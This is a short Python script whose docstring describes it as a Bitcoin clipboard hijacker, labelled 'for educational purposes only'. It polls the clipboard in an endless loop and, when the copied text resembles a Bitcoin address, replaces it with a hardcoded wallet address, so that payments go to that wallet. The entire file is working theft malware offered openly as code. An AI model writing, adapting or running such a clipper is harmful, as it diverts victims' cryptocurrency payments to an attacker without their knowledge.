"""
author = Angelo Giacco
INTENDED FOR EDUCATIONAL PURPOSES ONLY
Bitcoin is a very popular payment method
many people send money to each other using their wallet addresses
addresses are complicated strings of text that are hard to memorise
most people just copy and paste the wallet address
this script will continuously check what a user copies to their clipboard
if the data copied looks like a bitcoin address, it changes the address
thus, the money is rerouted to a different wallet when the user presses paste
"""
destination_address = b"1MwRNXWWqzbmsHova7FMW11zPftVZVUfbU" #caspian report btc
try:
    import Tkinter as tk #2.x
except ImportError:
    import tkinter as tk #3.x

def getClipboardText():
    root = tk.Tk()
    root.withdraw()
    data = root.clipboard_get()
    change_clipboard(root,data)

def change_clipboard(r,d):
    if (len(d) >= 25 and len(d) <= 34) and d[0] == '1':
        r.clipboard_clear()
        r.clipboard_append(destination_address)
        r.update()
        r.destroy()

while True:
    getClipboardText()
